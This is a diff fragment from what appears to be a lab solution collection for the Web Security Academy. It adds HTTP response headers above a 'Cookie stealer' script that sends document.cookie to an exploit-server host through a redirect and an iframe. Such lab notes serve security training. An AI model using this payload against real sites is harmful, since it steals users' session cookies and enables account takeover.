@@ -656,6 +656,9 @@ An account delete feature specifies the path in a serialized format: `s:19:"user
 ### Cookie stealer
 
 ```html
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
 <script>
 location = "https://ID.web-security-academy.net/?parameter=" + encodeURIComponent("<iframe src='https://exploit-ID.exploit-server.net/?cookies=" + document.cookie + "'>");
 </script>
